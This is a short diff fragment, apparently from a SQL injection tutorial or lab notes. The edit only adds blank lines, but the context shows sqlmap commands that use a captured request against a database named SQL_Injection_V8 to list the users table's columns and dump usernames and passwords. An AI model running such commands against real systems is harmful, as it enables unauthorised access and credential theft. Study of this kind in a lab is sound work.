@@ -213,4 +213,6 @@ python sqlmap.py -r post_sql.txt -D SQL_Injection_V8 -T users --columns
 
  python sqlmap.py -r post_sql.txt -D SQL_Injection_V8 -T users -C id,username,password --dump
 
+ 
+
 
